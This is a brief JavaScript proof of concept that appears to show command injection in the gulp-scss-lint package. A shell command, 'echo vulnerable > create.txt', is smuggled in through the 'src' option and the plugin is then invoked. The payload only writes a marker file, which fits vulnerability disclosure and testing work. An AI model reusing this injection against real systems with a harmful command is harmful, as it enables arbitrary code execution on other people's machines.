var root = require("gulp-scss-lint");
var attack_code = "echo vulnerable > create.txt";
var opt = {
  "src": attack_code
}
root(opt);
